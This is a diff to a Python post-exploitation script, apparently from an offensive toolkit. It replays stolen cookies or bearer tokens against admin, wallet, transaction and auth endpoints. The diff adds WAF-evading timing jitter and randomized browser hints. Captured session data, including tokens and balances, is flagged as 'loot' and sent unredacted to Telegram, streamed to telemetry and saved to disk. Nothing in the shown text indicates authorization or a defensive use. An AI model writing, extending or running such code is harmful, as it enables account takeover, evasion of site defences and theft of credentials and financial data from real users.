@@ -1,34 +1,48 @@
 #!/usr/bin/env python3
 """
-LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v8.0 (With Telegram Telemetry)
-Senior Red Team Edition: Structural JSON schema validation, strict negative DOM assertions,
-centralized framework loot exfiltration, and real-time Telegram broadcasting.
+LIVE_LOGIN_VERIFIER.PY v8.6 — Post-Exploitation Session & Privilege Verification (Elite Red Team Adversarial Edition)
+Features:
+- Structural JSON schema validation, strict negative DOM assertions, and SPA shell filtering
+- Poisson behavioral timing jitter & WAF-evading randomized browser client hints
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and cryptographic integrity hashing
+- Real-time unredacted Telegram telemetry broadcasting and instant proof-of-work streaming
 """
 import sys
 import os
 import time
 import json
+import hashlib
 import httpx
 import asyncio
 from urllib.parse import urlsplit
 
-# Import centralized framework loot logger, telemetry, and Telegram notifier
+# Import centralized framework loot logger, telemetry, behavioral mimicry, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous verifier functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -49,7 +63,6 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
         "/api/user/wallet",
         "/api/user/transaction",
         "/user/transaction",
-        "transaction",
         "/api/auth/user",
         "/api/dashboard/stats"
     ]
@@ -61,6 +74,7 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
         "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
     }
+    headers.update(get_randomized_hints())
 
     if token:
         headers["Authorization"] = f"Bearer {token}"
@@ -70,7 +84,9 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
     with httpx.Client(verify=False, follow_redirects=True, cookies=cookies, timeout=10.0) as client:
         for ep in targets:
             target_endpoint = f"{base_url}{ep}"
-            log(f"\n[***] RED TEAM VERIFICATION: Probing {target_endpoint} [***]", "\033[95m")
+            log(f"\n[***] RED TEAM VERIFICATION: Probing {target_endpoint} (WAF Hardened) [***]", "\033[95m")
+
+            apply_behavioral_jitter()
 
             try:
                 response = client.get(target_endpoint, headers=headers)
@@ -82,22 +98,22 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
                 if "application/json" in content_type or body.startswith("{") or body.startswith("["):
                     try:
                         data = json.loads(body)
-                        has_user_keys = any(k in data for k in ["user", "token", "access_token", "balance", "wallet", "email"])
+                        has_user_keys = any(k in data for k in ["user", "token", "access_token", "balance", "wallet", "email", "role"])
                         is_error_payload = data.get("status") == "error" or "message" in data and "unauthorized" in str(data["message"]).lower()
                         
                         if status in [200, 201] and has_user_keys and not is_error_payload:
                             log(f"[!!!] SUCCESS! Verified API Session Loot at {ep} [HTTP {status}] [!!!]", "\033[91m")
                             
+                            loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
                             loot_payload = {
                                 "endpoint": target_endpoint,
                                 "status": status,
+                                "integrity_hash": loot_hash,
                                 "verified_data": data
                             }
 
-                            # BROADCAST UNREDACTED SESSION LOOT STRAIGHT TO TELEGRAM
+                            # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                             broadcast_tg_alert_sync("Live Login Verified API Session Loot", loot_payload)
-
-                            # Stream telemetry and persist through centralized loot logger
                             stream_proof("LIVE_LOGIN_VERIFIED_API", ep, {"cookie_jar": cookies}, body, data)
                             save_session_loot(
                                 target=base_url,
@@ -129,16 +145,16 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
                 if status == 200 and not is_spa_shell and has_real_dashboard_markers:
                     log(f"[!!!] SUCCESS! Verified HTML Dashboard Access at {ep} [HTTP {status}] [!!!]", "\033[91m")
                     
+                    loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
                     loot_payload = {
                         "endpoint": target_endpoint,
                         "status": status,
+                        "integrity_hash": loot_hash,
                         "response_excerpt": body[:300]
                     }
 
-                    # BROADCAST UNREDACTED DASHBOARD LOOT STRAIGHT TO TELEGRAM
+                    # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                     broadcast_tg_alert_sync("Live Login Verified HTML Dashboard Access", loot_payload)
-
-                    # Stream telemetry and persist through centralized loot logger
                     stream_proof("LIVE_LOGIN_VERIFIED_HTML", ep, {"cookie_jar": cookies}, body[:300], {"status": status})
                     save_session_loot(
                         target=base_url,
